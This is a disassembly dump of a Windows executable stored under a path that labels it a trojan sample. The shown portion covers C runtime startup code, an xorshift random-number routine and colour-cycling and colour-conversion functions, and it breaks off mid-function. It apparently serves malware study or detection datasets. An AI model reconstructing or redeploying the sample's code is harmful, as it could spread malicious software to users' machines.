
malware_samples/trojan/410f5f58641fa7f7c47aeb2787e01f1431362cdf1a5f8e1ad36bfdd4c1335d24.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	c3                   	ret
  401001:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401008:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40100f:	90                   	nop
  401010:	83 ec 1c             	sub    $0x1c,%esp
  401013:	31 c0                	xor    %eax,%eax
  401015:	66 81 3d 00 00 40 00 	cmpw   $0x5a4d,0x400000
  40101c:	4d 5a 
  40101e:	c7 05 8c 93 40 00 01 	movl   $0x1,0x40938c
  401025:	00 00 00 
  401028:	c7 05 88 93 40 00 01 	movl   $0x1,0x409388
  40102f:	00 00 00 
  401032:	c7 05 84 93 40 00 01 	movl   $0x1,0x409384
  401039:	00 00 00 
  40103c:	c7 05 3c 90 40 00 01 	movl   $0x1,0x40903c
  401043:	00 00 00 
  401046:	75 18                	jne    0x401060
  401048:	8b 15 3c 00 40 00    	mov    0x40003c,%edx
  40104e:	81 ba 00 00 40 00 50 	cmpl   $0x4550,0x400000(%edx)
  401055:	45 00 00 
  401058:	8d 8a 00 00 40 00    	lea    0x400000(%edx),%ecx
  40105e:	74 50                	je     0x4010b0
  401060:	a3 0c 90 40 00       	mov    %eax,0x40900c
  401065:	a1 94 93 40 00       	mov    0x409394,%eax
  40106a:	85 c0                	test   %eax,%eax
  40106c:	75 32                	jne    0x4010a0
  40106e:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
  401075:	e8 3e 5e 00 00       	call   0x406eb8
  40107a:	e8 41 5e 00 00       	call   0x406ec0
  40107f:	8b 15 a8 93 40 00    	mov    0x4093a8,%edx
  401085:	89 10                	mov    %edx,(%eax)
  401087:	e8 04 4c 00 00       	call   0x405c90
  40108c:	83 3d 18 70 40 00 01 	cmpl   $0x1,0x407018
  401093:	74 4b                	je     0x4010e0
  401095:	31 c0                	xor    %eax,%eax
  401097:	83 c4 1c             	add    $0x1c,%esp
  40109a:	c3                   	ret
  40109b:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  40109f:	90                   	nop
  4010a0:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)
  4010a7:	e8 0c 5e 00 00       	call   0x406eb8
  4010ac:	eb cc                	jmp    0x40107a
  4010ae:	66 90                	xchg   %ax,%ax
  4010b0:	0f b7 51 18          	movzwl 0x18(%ecx),%edx
  4010b4:	66 81 fa 0b 01       	cmp    $0x10b,%dx
  4010b9:	74 3d                	je     0x4010f8
  4010bb:	66 81 fa 0b 02       	cmp    $0x20b,%dx
  4010c0:	75 9e                	jne    0x401060
  4010c2:	83 b9 84 00 00 00 0e 	cmpl   $0xe,0x84(%ecx)
  4010c9:	76 95                	jbe    0x401060
  4010cb:	8b 91 f8 00 00 00    	mov    0xf8(%ecx),%edx
  4010d1:	31 c0                	xor    %eax,%eax
  4010d3:	85 d2                	test   %edx,%edx
  4010d5:	0f 95 c0             	setne  %al
  4010d8:	eb 86                	jmp    0x401060
  4010da:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4010e0:	c7 04 24 f0 5e 40 00 	movl   $0x405ef0,(%esp)
  4010e7:	e8 14 53 00 00       	call   0x406400
  4010ec:	31 c0                	xor    %eax,%eax
  4010ee:	83 c4 1c             	add    $0x1c,%esp
  4010f1:	c3                   	ret
  4010f2:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4010f8:	83 79 74 0e          	cmpl   $0xe,0x74(%ecx)
  4010fc:	0f 86 5e ff ff ff    	jbe    0x401060
  401102:	8b 89 e8 00 00 00    	mov    0xe8(%ecx),%ecx
  401108:	31 c0                	xor    %eax,%eax
  40110a:	85 c9                	test   %ecx,%ecx
  40110c:	0f 95 c0             	setne  %al
  40110f:	e9 4c ff ff ff       	jmp    0x401060
  401114:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40111b:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  40111f:	90                   	nop
  401120:	83 ec 2c             	sub    $0x2c,%esp
  401123:	a1 80 93 40 00       	mov    0x409380,%eax
  401128:	c7 44 24 10 04 90 40 	movl   $0x409004,0x10(%esp)
  40112f:	00 
  401130:	a3 04 90 40 00       	mov    %eax,0x409004
  401135:	a1 38 90 40 00       	mov    0x409038,%eax
  40113a:	c7 44 24 08 14 90 40 	movl   $0x409014,0x8(%esp)
  401141:	00 
  401142:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401146:	c7 44 24 04 18 90 40 	movl   $0x409018,0x4(%esp)
  40114d:	00 
  40114e:	c7 04 24 1c 90 40 00 	movl   $0x40901c,(%esp)
  401155:	e8 76 5d 00 00       	call   0x406ed0
  40115a:	83 c4 2c             	add    $0x2c,%esp
  40115d:	c3                   	ret
  40115e:	66 90                	xchg   %ax,%ax
  401160:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  401164:	83 e4 f0             	and    $0xfffffff0,%esp
  401167:	31 c0                	xor    %eax,%eax
  401169:	ff 71 fc             	push   -0x4(%ecx)
  40116c:	55                   	push   %ebp
  40116d:	89 e5                	mov    %esp,%ebp
  40116f:	57                   	push   %edi
  401170:	56                   	push   %esi
  401171:	8d 55 a4             	lea    -0x5c(%ebp),%edx
  401174:	53                   	push   %ebx
  401175:	89 d7                	mov    %edx,%edi
  401177:	51                   	push   %ecx
  401178:	b9 11 00 00 00       	mov    $0x11,%ecx
  40117d:	83 ec 78             	sub    $0x78,%esp
  401180:	8b 35 94 93 40 00    	mov    0x409394,%esi
  401186:	f3 ab                	rep stos %eax,%es:(%edi)
  401188:	85 f6                	test   %esi,%esi
  40118a:	0f 85 a0 02 00 00    	jne    0x401430
  401190:	64 a1 18 00 00 00    	mov    %fs:0x18,%eax
  401196:	8b 35 50 a2 40 00    	mov    0x40a250,%esi
  40119c:	8b 78 04             	mov    0x4(%eax),%edi
  40119f:	31 db                	xor    %ebx,%ebx
  4011a1:	eb 19                	jmp    0x4011bc
  4011a3:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4011a7:	90                   	nop
  4011a8:	39 c7                	cmp    %eax,%edi
  4011aa:	0f 84 18 02 00 00    	je     0x4013c8
  4011b0:	c7 04 24 e8 03 00 00 	movl   $0x3e8,(%esp)
  4011b7:	ff d6                	call   *%esi
  4011b9:	83 ec 04             	sub    $0x4,%esp
  4011bc:	89 d8                	mov    %ebx,%eax
  4011be:	f0 0f b1 3d e0 93 40 	lock cmpxchg %edi,0x4093e0
  4011c5:	00 
  4011c6:	85 c0                	test   %eax,%eax
  4011c8:	75 de                	jne    0x4011a8
  4011ca:	a1 e4 93 40 00       	mov    0x4093e4,%eax
  4011cf:	31 db                	xor    %ebx,%ebx
  4011d1:	83 f8 01             	cmp    $0x1,%eax
  4011d4:	0f 84 01 02 00 00    	je     0x4013db
  4011da:	a1 e4 93 40 00       	mov    0x4093e4,%eax
  4011df:	85 c0                	test   %eax,%eax
  4011e1:	0f 84 79 02 00 00    	je     0x401460
  4011e7:	c7 05 08 90 40 00 01 	movl   $0x1,0x409008
  4011ee:	00 00 00 
  4011f1:	a1 e4 93 40 00       	mov    0x4093e4,%eax
  4011f6:	83 f8 01             	cmp    $0x1,%eax
  4011f9:	0f 84 f6 01 00 00    	je     0x4013f5
  4011ff:	85 db                	test   %ebx,%ebx
  401201:	0f 84 14 02 00 00    	je     0x40141b
  401207:	a1 70 81 40 00       	mov    0x408170,%eax
  40120c:	85 c0                	test   %eax,%eax
  40120e:	74 1c                	je     0x40122c
  401210:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  401217:	00 
  401218:	c7 44 24 04 02 00 00 	movl   $0x2,0x4(%esp)
  40121f:	00 
  401220:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  401227:	ff d0                	call   *%eax
  401229:	83 ec 0c             	sub    $0xc,%esp
  40122c:	e8 ef 4e 00 00       	call   0x406120
  401231:	c7 04 24 10 64 40 00 	movl   $0x406410,(%esp)
  401238:	ff 15 4c a2 40 00    	call   *0x40a24c
  40123e:	83 ec 04             	sub    $0x4,%esp
  401241:	a3 ac 93 40 00       	mov    %eax,0x4093ac
  401246:	c7 04 24 00 10 40 00 	movl   $0x401000,(%esp)
  40124d:	e8 ae 5c 00 00       	call   0x406f00
  401252:	e8 19 4d 00 00       	call   0x405f70
  401257:	c7 05 dc 93 40 00 00 	movl   $0x400000,0x4093dc
  40125e:	00 40 00 
  401261:	e8 62 5c 00 00       	call   0x406ec8
  401266:	31 c9                	xor    %ecx,%ecx
  401268:	8b 00                	mov    (%eax),%eax
  40126a:	85 c0                	test   %eax,%eax
  40126c:	75 13                	jne    0x401281
  40126e:	eb 4d                	jmp    0x4012bd
  401270:	84 d2                	test   %dl,%dl
  401272:	74 44                	je     0x4012b8
  401274:	83 e1 01             	and    $0x1,%ecx
  401277:	74 27                	je     0x4012a0
  401279:	b9 01 00 00 00       	mov    $0x1,%ecx
  40127e:	83 c0 01             	add    $0x1,%eax
  401281:	0f b6 10             	movzbl (%eax),%edx
  401284:	80 fa 20             	cmp    $0x20,%dl
  401287:	7e e7                	jle    0x401270
  401289:	89 cb                	mov    %ecx,%ebx
  40128b:	83 f3 01             	xor    $0x1,%ebx
  40128e:	80 fa 22             	cmp    $0x22,%dl
  401291:	0f 44 cb             	cmove  %ebx,%ecx
  401294:	eb e8                	jmp    0x40127e
  401296:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40129d:	8d 76 00             	lea    0x0(%esi),%esi
  4012a0:	84 d2                	test   %dl,%dl
  4012a2:	74 14                	je     0x4012b8
  4012a4:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4012a8:	0f b6 50 01          	movzbl 0x1(%eax),%edx
  4012ac:	83 c0 01             	add    $0x1,%eax
  4012af:	84 d2                	test   %dl,%dl
  4012b1:	74 05                	je     0x4012b8
  4012b3:	80 fa 20             	cmp    $0x20,%dl
  4012b6:	7e f0                	jle    0x4012a8
  4012b8:	a3 d8 93 40 00       	mov    %eax,0x4093d8
  4012bd:	8b 1d 94 93 40 00    	mov    0x409394,%ebx
  4012c3:	85 db                	test   %ebx,%ebx
  4012c5:	74 14                	je     0x4012db
  4012c7:	b8 0a 00 00 00       	mov    $0xa,%eax
  4012cc:	f6 45 d0 01          	testb  $0x1,-0x30(%ebp)
  4012d0:	0f 85 e2 00 00 00    	jne    0x4013b8
  4012d6:	a3 00 70 40 00       	mov    %eax,0x407000
  4012db:	8b 1d 1c 90 40 00    	mov    0x40901c,%ebx
  4012e1:	8d 34 9d 04 00 00 00 	lea    0x4(,%ebx,4),%esi
  4012e8:	89 34 24             	mov    %esi,(%esp)
  4012eb:	e8 60 5b 00 00       	call   0x406e50
  4012f0:	8b 15 18 90 40 00    	mov    0x409018,%edx
  4012f6:	89 45 90             	mov    %eax,-0x70(%ebp)
  4012f9:	85 db                	test   %ebx,%ebx
  4012fb:	0f 8e 82 01 00 00    	jle    0x401483
  401301:	89 c3                	mov    %eax,%ebx
  401303:	8d 46 fc             	lea    -0x4(%esi),%eax
  401306:	89 d7                	mov    %edx,%edi
  401308:	89 45 8c             	mov    %eax,-0x74(%ebp)
  40130b:	01 d0                	add    %edx,%eax
  40130d:	89 45 94             	mov    %eax,-0x6c(%ebp)
  401310:	8b 07                	mov    (%edi),%eax
  401312:	83 c3 04             	add    $0x4,%ebx
  401315:	83 c7 04             	add    $0x4,%edi
  401318:	89 04 24             	mov    %eax,(%esp)
  40131b:	e8 08 5b 00 00       	call   0x406e28
  401320:	8d 70 01             	lea    0x1(%eax),%esi
  401323:	89 34 24             	mov    %esi,(%esp)
  401326:	e8 25 5b 00 00       	call   0x406e50
  40132b:	89 43 fc             	mov    %eax,-0x4(%ebx)
  40132e:	8b 4f fc             	mov    -0x4(%edi),%ecx
  401331:	89 74 24 08          	mov    %esi,0x8(%esp)
  401335:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  401339:	89 04 24             	mov    %eax,(%esp)
  40133c:	e8 ff 5a 00 00       	call   0x406e40
  401341:	39 7d 94             	cmp    %edi,-0x6c(%ebp)
  401344:	75 ca                	jne    0x401310
  401346:	8b 45 8c             	mov    -0x74(%ebp),%eax
  401349:	03 45 90             	add    -0x70(%ebp),%eax
  40134c:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  401352:	8b 45 90             	mov    -0x70(%ebp),%eax
  401355:	a3 18 90 40 00       	mov    %eax,0x409018
  40135a:	e8 01 49 00 00       	call   0x405c60
  40135f:	a1 14 90 40 00       	mov    0x409014,%eax
  401364:	8b 15 7c a2 40 00    	mov    0x40a27c,%edx
  40136a:	89 02                	mov    %eax,(%edx)
  40136c:	89 44 24 08          	mov    %eax,0x8(%esp)
  401370:	a1 18 90 40 00       	mov    0x409018,%eax
  401375:	89 44 24 04          	mov    %eax,0x4(%esp)
  401379:	a1 1c 90 40 00       	mov    0x40901c,%eax
  40137e:	89 04 24             	mov    %eax,(%esp)
  401381:	e8 8a 5b 00 00       	call   0x406f10
  401386:	8b 0d 0c 90 40 00    	mov    0x40900c,%ecx
  40138c:	a3 10 90 40 00       	mov    %eax,0x409010
  401391:	85 c9                	test   %ecx,%ecx
  401393:	0f 84 f2 00 00 00    	je     0x40148b
  401399:	8b 15 08 90 40 00    	mov    0x409008,%edx
  40139f:	85 d2                	test   %edx,%edx
  4013a1:	0f 84 a1 00 00 00    	je     0x401448
  4013a7:	8d 65 f0             	lea    -0x10(%ebp),%esp
  4013aa:	59                   	pop    %ecx
  4013ab:	5b                   	pop    %ebx
  4013ac:	5e                   	pop    %esi
  4013ad:	5f                   	pop    %edi
  4013ae:	5d                   	pop    %ebp
  4013af:	8d 61 fc             	lea    -0x4(%ecx),%esp
  4013b2:	c3                   	ret
  4013b3:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4013b7:	90                   	nop
  4013b8:	0f b7 45 d4          	movzwl -0x2c(%ebp),%eax
  4013bc:	e9 15 ff ff ff       	jmp    0x4012d6
  4013c1:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4013c8:	a1 e4 93 40 00       	mov    0x4093e4,%eax
  4013cd:	bb 01 00 00 00       	mov    $0x1,%ebx
  4013d2:	83 f8 01             	cmp    $0x1,%eax
  4013d5:	0f 85 ff fd ff ff    	jne    0x4011da
  4013db:	c7 04 24 1f 00 00 00 	movl   $0x1f,(%esp)
  4013e2:	e8 c1 5a 00 00       	call   0x406ea8
  4013e7:	a1 e4 93 40 00       	mov    0x4093e4,%eax
  4013ec:	83 f8 01             	cmp    $0x1,%eax
  4013ef:	0f 85 0a fe ff ff    	jne    0x4011ff
  4013f5:	c7 44 24 04 08 b0 40 	movl   $0x40b008,0x4(%esp)
  4013fc:	00 
  4013fd:	c7 04 24 00 b0 40 00 	movl   $0x40b000,(%esp)
  401404:	e8 87 5a 00 00       	call   0x406e90
  401409:	c7 05 e4 93 40 00 02 	movl   $0x2,0x4093e4
  401410:	00 00 00 
  401413:	85 db                	test   %ebx,%ebx
  401415:	0f 85 ec fd ff ff    	jne    0x401207
  40141b:	87 1d e0 93 40 00    	xchg   %ebx,0x4093e0
  401421:	e9 e1 fd ff ff       	jmp    0x401207
  401426:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40142d:	8d 76 00             	lea    0x0(%esi),%esi
  401430:	89 14 24             	mov    %edx,(%esp)
  401433:	ff 15 34 a2 40 00    	call   *0x40a234
  401439:	83 ec 04             	sub    $0x4,%esp
  40143c:	e9 4f fd ff ff       	jmp    0x401190
  401441:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401448:	e8 53 5a 00 00       	call   0x406ea0
  40144d:	a1 10 90 40 00       	mov    0x409010,%eax
  401452:	8d 65 f0             	lea    -0x10(%ebp),%esp
  401455:	59                   	pop    %ecx
  401456:	5b                   	pop    %ebx
  401457:	5e                   	pop    %esi
  401458:	5f                   	pop    %edi
  401459:	5d                   	pop    %ebp
  40145a:	8d 61 fc             	lea    -0x4(%ecx),%esp
  40145d:	c3                   	ret
  40145e:	66 90                	xchg   %ax,%ax
  401460:	c7 44 24 04 18 b0 40 	movl   $0x40b018,0x4(%esp)
  401467:	00 
  401468:	c7 04 24 0c b0 40 00 	movl   $0x40b00c,(%esp)
  40146f:	c7 05 e4 93 40 00 01 	movl   $0x1,0x4093e4
  401476:	00 00 00 
  401479:	e8 12 5a 00 00       	call   0x406e90
  40147e:	e9 6e fd ff ff       	jmp    0x4011f1
  401483:	8b 45 90             	mov    -0x70(%ebp),%eax
  401486:	e9 c1 fe ff ff       	jmp    0x40134c
  40148b:	89 04 24             	mov    %eax,(%esp)
  40148e:	e8 dd 59 00 00       	call   0x406e70
  401493:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40149a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4014a0:	83 ec 0c             	sub    $0xc,%esp
  4014a3:	c7 05 94 93 40 00 01 	movl   $0x1,0x409394
  4014aa:	00 00 00 
  4014ad:	e8 ee 47 00 00       	call   0x405ca0
  4014b2:	83 c4 0c             	add    $0xc,%esp
  4014b5:	e9 a6 fc ff ff       	jmp    0x401160
  4014ba:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4014c0:	83 ec 0c             	sub    $0xc,%esp
  4014c3:	c7 05 94 93 40 00 00 	movl   $0x0,0x409394
  4014ca:	00 00 00 
  4014cd:	e8 ce 47 00 00       	call   0x405ca0
  4014d2:	83 c4 0c             	add    $0xc,%esp
  4014d5:	e9 86 fc ff ff       	jmp    0x401160
  4014da:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4014e0:	83 ec 1c             	sub    $0x1c,%esp
  4014e3:	8b 44 24 20          	mov    0x20(%esp),%eax
  4014e7:	89 04 24             	mov    %eax,(%esp)
  4014ea:	e8 99 59 00 00       	call   0x406e88
  4014ef:	85 c0                	test   %eax,%eax
  4014f1:	0f 94 c0             	sete   %al
  4014f4:	83 c4 1c             	add    $0x1c,%esp
  4014f7:	0f b6 c0             	movzbl %al,%eax
  4014fa:	f7 d8                	neg    %eax
  4014fc:	c3                   	ret
  4014fd:	90                   	nop
  4014fe:	90                   	nop
  4014ff:	90                   	nop
  401500:	55                   	push   %ebp
  401501:	89 e5                	mov    %esp,%ebp
  401503:	83 ec 18             	sub    $0x18,%esp
  401506:	c7 04 24 20 15 40 00 	movl   $0x401520,(%esp)
  40150d:	e8 ce ff ff ff       	call   0x4014e0
  401512:	c9                   	leave
  401513:	c3                   	ret
  401514:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40151b:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  40151f:	90                   	nop
  401520:	c3                   	ret
  401521:	90                   	nop
  401522:	90                   	nop
  401523:	90                   	nop
  401524:	90                   	nop
  401525:	90                   	nop
  401526:	90                   	nop
  401527:	90                   	nop
  401528:	90                   	nop
  401529:	90                   	nop
  40152a:	90                   	nop
  40152b:	90                   	nop
  40152c:	90                   	nop
  40152d:	90                   	nop
  40152e:	90                   	nop
  40152f:	90                   	nop
  401530:	55                   	push   %ebp
  401531:	89 e5                	mov    %esp,%ebp
  401533:	8b 45 08             	mov    0x8(%ebp),%eax
  401536:	a3 20 90 40 00       	mov    %eax,0x409020
  40153b:	90                   	nop
  40153c:	5d                   	pop    %ebp
  40153d:	c3                   	ret
  40153e:	55                   	push   %ebp
  40153f:	89 e5                	mov    %esp,%ebp
  401541:	a1 20 90 40 00       	mov    0x409020,%eax
  401546:	c1 e0 0d             	shl    $0xd,%eax
  401549:	89 c2                	mov    %eax,%edx
  40154b:	a1 20 90 40 00       	mov    0x409020,%eax
  401550:	31 d0                	xor    %edx,%eax
  401552:	a3 20 90 40 00       	mov    %eax,0x409020
  401557:	a1 20 90 40 00       	mov    0x409020,%eax
  40155c:	c1 e0 11             	shl    $0x11,%eax
  40155f:	89 c2                	mov    %eax,%edx
  401561:	a1 20 90 40 00       	mov    0x409020,%eax
  401566:	31 d0                	xor    %edx,%eax
  401568:	a3 20 90 40 00       	mov    %eax,0x409020
  40156d:	a1 20 90 40 00       	mov    0x409020,%eax
  401572:	c1 e0 05             	shl    $0x5,%eax
  401575:	89 c2                	mov    %eax,%edx
  401577:	a1 20 90 40 00       	mov    0x409020,%eax
  40157c:	31 d0                	xor    %edx,%eax
  40157e:	a3 20 90 40 00       	mov    %eax,0x409020
  401583:	a1 20 90 40 00       	mov    0x409020,%eax
  401588:	5d                   	pop    %ebp
  401589:	c3                   	ret
  40158a:	55                   	push   %ebp
  40158b:	89 e5                	mov    %esp,%ebp
  40158d:	a1 24 90 40 00       	mov    0x409024,%eax
  401592:	83 f8 05             	cmp    $0x5,%eax
  401595:	0f 87 8e 01 00 00    	ja     0x401729
  40159b:	8b 04 85 00 80 40 00 	mov    0x408000(,%eax,4),%eax
  4015a2:	ff e0                	jmp    *%eax
  4015a4:	c7 05 28 90 40 00 ff 	movl   $0xff,0x409028
  4015ab:	00 00 00 
  4015ae:	c7 05 30 90 40 00 00 	movl   $0x0,0x409030
  4015b5:	00 00 00 
  4015b8:	a1 2c 90 40 00       	mov    0x40902c,%eax
  4015bd:	3d fe 00 00 00       	cmp    $0xfe,%eax
  4015c2:	7f 15                	jg     0x4015d9
  4015c4:	8b 15 2c 90 40 00    	mov    0x40902c,%edx
  4015ca:	8b 45 08             	mov    0x8(%ebp),%eax
  4015cd:	01 d0                	add    %edx,%eax
  4015cf:	a3 2c 90 40 00       	mov    %eax,0x40902c
  4015d4:	e9 50 01 00 00       	jmp    0x401729
  4015d9:	a1 24 90 40 00       	mov    0x409024,%eax
  4015de:	83 c0 01             	add    $0x1,%eax
  4015e1:	a3 24 90 40 00       	mov    %eax,0x409024
  4015e6:	e9 3e 01 00 00       	jmp    0x401729
  4015eb:	c7 05 2c 90 40 00 ff 	movl   $0xff,0x40902c
  4015f2:	00 00 00 
  4015f5:	c7 05 30 90 40 00 00 	movl   $0x0,0x409030
  4015fc:	00 00 00 
  4015ff:	a1 28 90 40 00       	mov    0x409028,%eax
  401604:	85 c0                	test   %eax,%eax
  401606:	7e 12                	jle    0x40161a
  401608:	a1 28 90 40 00       	mov    0x409028,%eax
  40160d:	2b 45 08             	sub    0x8(%ebp),%eax
  401610:	a3 28 90 40 00       	mov    %eax,0x409028
  401615:	e9 0f 01 00 00       	jmp    0x401729
  40161a:	a1 24 90 40 00       	mov    0x409024,%eax
  40161f:	83 c0 01             	add    $0x1,%eax
  401622:	a3 24 90 40 00       	mov    %eax,0x409024
  401627:	e9 fd 00 00 00       	jmp    0x401729
  40162c:	c7 05 2c 90 40 00 ff 	movl   $0xff,0x40902c
  401633:	00 00 00 
  401636:	c7 05 28 90 40 00 00 	movl   $0x0,0x409028
  40163d:	00 00 00 
  401640:	a1 30 90 40 00       	mov    0x409030,%eax
  401645:	3d fe 00 00 00       	cmp    $0xfe,%eax
  40164a:	7f 15                	jg     0x401661
  40164c:	8b 15 30 90 40 00    	mov    0x409030,%edx
  401652:	8b 45 08             	mov    0x8(%ebp),%eax
  401655:	01 d0                	add    %edx,%eax
  401657:	a3 30 90 40 00       	mov    %eax,0x409030
  40165c:	e9 c8 00 00 00       	jmp    0x401729
  401661:	a1 24 90 40 00       	mov    0x409024,%eax
  401666:	83 c0 01             	add    $0x1,%eax
  401669:	a3 24 90 40 00       	mov    %eax,0x409024
  40166e:	e9 b6 00 00 00       	jmp    0x401729
  401673:	c7 05 30 90 40 00 ff 	movl   $0xff,0x409030
  40167a:	00 00 00 
  40167d:	c7 05 28 90 40 00 00 	movl   $0x0,0x409028
  401684:	00 00 00 
  401687:	a1 2c 90 40 00       	mov    0x40902c,%eax
  40168c:	85 c0                	test   %eax,%eax
  40168e:	7e 12                	jle    0x4016a2
  401690:	a1 2c 90 40 00       	mov    0x40902c,%eax
  401695:	2b 45 08             	sub    0x8(%ebp),%eax
  401698:	a3 2c 90 40 00       	mov    %eax,0x40902c
  40169d:	e9 87 00 00 00       	jmp    0x401729
  4016a2:	a1 24 90 40 00       	mov    0x409024,%eax
  4016a7:	83 c0 01             	add    $0x1,%eax
  4016aa:	a3 24 90 40 00       	mov    %eax,0x409024
  4016af:	eb 78                	jmp    0x401729
  4016b1:	c7 05 30 90 40 00 ff 	movl   $0xff,0x409030
  4016b8:	00 00 00 
  4016bb:	c7 05 2c 90 40 00 00 	movl   $0x0,0x40902c
  4016c2:	00 00 00 
  4016c5:	a1 28 90 40 00       	mov    0x409028,%eax
  4016ca:	3d fe 00 00 00       	cmp    $0xfe,%eax
  4016cf:	7f 12                	jg     0x4016e3
  4016d1:	8b 15 28 90 40 00    	mov    0x409028,%edx
  4016d7:	8b 45 08             	mov    0x8(%ebp),%eax
  4016da:	01 d0                	add    %edx,%eax
  4016dc:	a3 28 90 40 00       	mov    %eax,0x409028
  4016e1:	eb 46                	jmp    0x401729
  4016e3:	a1 24 90 40 00       	mov    0x409024,%eax
  4016e8:	83 c0 01             	add    $0x1,%eax
  4016eb:	a3 24 90 40 00       	mov    %eax,0x409024
  4016f0:	eb 37                	jmp    0x401729
  4016f2:	c7 05 28 90 40 00 ff 	movl   $0xff,0x409028
  4016f9:	00 00 00 
  4016fc:	c7 05 2c 90 40 00 00 	movl   $0x0,0x40902c
  401703:	00 00 00 
  401706:	a1 30 90 40 00       	mov    0x409030,%eax
  40170b:	85 c0                	test   %eax,%eax
  40170d:	7e 0f                	jle    0x40171e
  40170f:	a1 30 90 40 00       	mov    0x409030,%eax
  401714:	2b 45 08             	sub    0x8(%ebp),%eax
  401717:	a3 30 90 40 00       	mov    %eax,0x409030
  40171c:	eb 0a                	jmp    0x401728
  40171e:	c7 05 24 90 40 00 00 	movl   $0x0,0x409024
  401725:	00 00 00 
  401728:	90                   	nop
  401729:	a1 28 90 40 00       	mov    0x409028,%eax
  40172e:	0f b6 c0             	movzbl %al,%eax
  401731:	8b 15 2c 90 40 00    	mov    0x40902c,%edx
  401737:	0f b6 d2             	movzbl %dl,%edx
  40173a:	c1 e2 08             	shl    $0x8,%edx
  40173d:	09 d0                	or     %edx,%eax
  40173f:	89 c2                	mov    %eax,%edx
  401741:	a1 30 90 40 00       	mov    0x409030,%eax
  401746:	0f b6 c0             	movzbl %al,%eax
  401749:	c1 e0 10             	shl    $0x10,%eax
  40174c:	09 d0                	or     %edx,%eax
  40174e:	5d                   	pop    %ebp
  40174f:	c3                   	ret
  401750:	55                   	push   %ebp
  401751:	89 e5                	mov    %esp,%ebp
  401753:	83 ec 44             	sub    $0x44,%esp
  401756:	0f b6 45 0e          	movzbl 0xe(%ebp),%eax
  40175a:	88 45 f7             	mov    %al,-0x9(%ebp)
  40175d:	0f b6 45 0d          	movzbl 0xd(%ebp),%eax
  401761:	88 45 f6             	mov    %al,-0xa(%ebp)
  401764:	0f b6 45 0c          	movzbl 0xc(%ebp),%eax
  401768:	88 45 f5             	mov    %al,-0xb(%ebp)
  40176b:	0f b6 45 f7          	movzbl -0x9(%ebp),%eax
  40176f:	66 89 45 be          	mov    %ax,-0x42(%ebp)
  401773:	df 45 be             	filds  -0x42(%ebp)
  401776:	d9 05 38 81 40 00    	flds   0x408138
  40177c:	de f9                	fdivrp %st,%st(1)
  40177e:	d9 5d f0             	fstps  -0x10(%ebp)
  401781:	0f b6 45 f6          	movzbl -0xa(%ebp),%eax
  401785:	66 89 45 be          	mov    %ax,-0x42(%ebp)
  401789:	df 45 be             	filds  -0x42(%ebp)
  40178c:	d9 05 38 81 40 00    	flds   0x408138
  401792:	de f9                	fdivrp %st,%st(1)
  401794:	d9 5d ec             	fstps  -0x14(%ebp)
  401797:	0f b6 45 f5          	movzbl -0xb(%ebp),%eax
  40179b:	66 89 45 be          	mov    %ax,-0x42(%ebp)
  40179f:	df 45 be             	filds  -0x42(%ebp)
  4017a2:	d9 05 38 81 40 00    	flds   0x408138
  4017a8:	de f9                	fdivrp %st,%st(1)
  4017aa:	d9 5d e8             	fstps  -0x18(%ebp)
  4017ad:	d9 45 f0             	flds   -0x10(%ebp)
  4017b0:	d9 45 ec             	flds   -0x14(%ebp)
  4017b3:	df f1                	fcomip %st(1),%st
  4017b5:	dd d8                	fstp   %st(0)
  4017b7:	76 05                	jbe    0x4017be
  4017b9:	d9 45 f0             	flds   -0x10(%ebp)
  4017bc:	eb 03                	jmp    0x4017c1
  4017be:	d9 45 ec             	flds   -0x14(%ebp)
  4017c1:	d9 45 e8             	flds   -0x18(%ebp)
  4017c4:	df f1                	fcomip %st(1),%st
  4017c6:	dd d8                	fstp   %st(0)
  4017c8:	76 16                	jbe    0x4017e0
  4017ca:	d9 45 f0             	flds   -0x10(%ebp)
  4017cd:	d9 45 ec             	flds   -0x14(%ebp)
  4017d0:	df f1                	fcomip %st(1),%st
  4017d2:	dd d8                	fstp   %st(0)
  4017d4:	76 05                	jbe    0x4017db
  4017d6:	d9 45 f0             	flds   -0x10(%ebp)
  4017d9:	eb 08                	jmp    0x4017e3
  4017db:	d9 45 ec             	flds   -0x14(%ebp)
  4017de:	eb 03                	jmp    0x4017e3
  4017e0:	d9 45 e8             	flds   -0x18(%ebp)
  4017e3:	d9 5d e4             	fstps  -0x1c(%ebp)
  4017e6:	d9 45 ec             	flds   -0x14(%ebp)
  4017e9:	d9 45 f0             	flds   -0x10(%ebp)
  4017ec:	df f1                	fcomip %st(1),%st
  4017ee:	dd d8                	fstp   %st(0)
  4017f0:	76 05                	jbe    0x4017f7
  4017f2:	d9 45 f0             	flds   -0x10(%ebp)
  4017f5:	eb 03                	jmp    0x4017fa
